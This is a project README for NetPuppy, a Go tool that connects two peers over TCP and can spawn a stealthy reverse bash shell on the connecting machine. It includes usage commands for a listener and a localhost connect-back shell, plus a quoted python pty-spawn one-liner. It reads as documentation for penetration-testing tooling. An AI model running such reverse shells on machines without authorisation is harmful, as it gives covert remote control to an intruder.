# NetPuppy
```
|8PPPPe
|8    |8 |eeee |eeeee    ___      .++.
|8e   |8 |8      |8   __/_, '.  .'    '. .
|88   |8 |8eee   |8e  \_,  | \_'  /   )'-')
|88   |8 |88     |88   U ) '-'    \  (('"'
|88   |8 |88ee   |88   ___Y  ,    .'7 /|
______________________(_,___/___.' (_/_/_
|8PPPPe
|8    |8 |e   .e |eeeee  |eeeee  |e   .e
|8eeee8  |8   |8 |8   |8 |8   |8 |8   |8
|88      |8e  |8 |8eee8  |8eee8  |8eee8
|88      |88  |8 |88     |88      |88
|88      |88ee8  |88     |88      |88
________________________________________
	
	  Launch a puppy to
   	~ sneef  and  fetch ~
	  data   for   you! 
```
### Say goodbye to that "`python -c import pty; pty.spawn('bash')`" bullsh*t!
NetPuppy is a CLI tool for establishing a TCP connection b/w two peers with the option to start a stable reverse shell on one of them. NP does this by creating a pseudoterminal, so the shell experience is similar to telnet or (un-encrypted) SSH.

Originally inspired by [Netcat](https://netcat.sourceforge.net/) (until I figured out what netcat actually does) & written in Golang!
## Install
- NetPuppy is a Go project, so make sure you at least have Go 1.22.1 installed. 
- **ADDITIONALLY** you will need gcc for the CGo!
1. Clone this repo
2. Run `go build` in the root directory
## Use:
NetPuppy has two primary modes: offense & connect-back.
### Offense
The 'offensive' peer is executed as a server and listens to the `0.0.0.0` address and a specified port. It will bind incoming TCP connections to that port.
### Connect-Back
The 'connect-back' peer starts w/ a client-like relationship to the offense peer. I.e. it will connect to the address and port you give it. Additionally, if you give the `--shell` flag, it will start a bash process on the local machine. This shell will take input from the offensive peer (via the socket) and execute the input as commands on the machine its running on. The output from the shell will then be echoed back to the Offensive peer.
#### Flags:
- `-H` the host IP address you want to connect to (in connect-back mode)
- `-p` the port you want to start your peer on (both mode types)
- `-l` tell NetPuppy to listen, this will start NP in the offense mode. You can also give a port number.
- `--shell` tell NetPuppy to start a bash shell on the client peer which will take socket input as stdin and output stdout/stderr back into the socket.
## Examples:
### Offense Peer:
```bash
go run main.go -l -p 44444
```
#### Output 
```
#... <banner>          

#    *sneef sneef*
#   .-.
#  / (_          |Host:  0.0.0.0
# ( "  6\___o    |RPort: 44444
# /  (  ___/     |LPort: 44444
#/     /  U      |Mode:  Offensive Server
```

### Connect-Back Peer:
```bash
go run main.go -H 0:0:0:0:0:0:0:1 -p 44444
```

#### Output
```
#...<banner>

#        bork!
#     __  /     |Host:  0:0:0:0:0:0:0:1
#(___()'';      |RPort: 44444
#/ )   /'       |LPort: 60804
#/\'--/\        |Mode:  Client
```

### Connect-Back Peer w/ shell:
The Connect-Back peer will **NOT** print any output to the terminal when the `--shell` flag is given (we're trying to be sneaky). Any errors will be sent through the socket to the Offensive peer (unless the socket hasn't been connected yet, in that case NP will just exit without printing anything on the target machine).
```bash
go run main.go -H 127.0.0.1 -p 44444 --shell
```

## Goals
NetPuppy will be able to:
- [x] listen for & serve incoming TCP connections as well as initiate outgoing ones
- [ ] maintain a stable connections b/w both parties (currently improving on this, see branch [58-stabilize-shell-pty](https://github.com/TrshPuppy/netpuppy/tree/58-stabilize-shell-pty)
- [x] send and receive data from either endpoint
- [x] initiate a 'helper shell' on the client peer



## This project is still being built & improved!
### Contributing:
Just fork and create a pull request w/ a description of your changes. I (TrshPuppy) will review it! :)
### Python?
This project was originally written in Python. If you'd like to fork the Python branch (which isn't being updated), you can check it out [here](https://github.com/TrshPuppy/NetPuppy/tree/python-version-abandoned)!
